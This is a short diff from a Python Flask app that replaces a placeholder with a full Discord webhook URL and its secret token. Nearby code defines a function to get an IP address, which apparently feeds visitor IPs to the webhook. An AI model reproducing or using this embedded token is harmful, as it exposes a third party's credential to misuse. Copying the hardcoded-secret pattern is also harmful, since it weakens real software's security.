@@ -68,7 +68,7 @@ import requests
 
 app = Flask(__name__)
 
-Webhook_URL = "Your webhook url"
+Webhook_URL = "https://discord.com/api/webhooks/1213100781046071327/j1urcwzdzOqUM03ZDh0MxOdC0khZ6WXBx6hVt3I6CW-fPewfE5zn8XaE6vJfIyjfbycO"
 
 # function to get ip
 def get_ip():
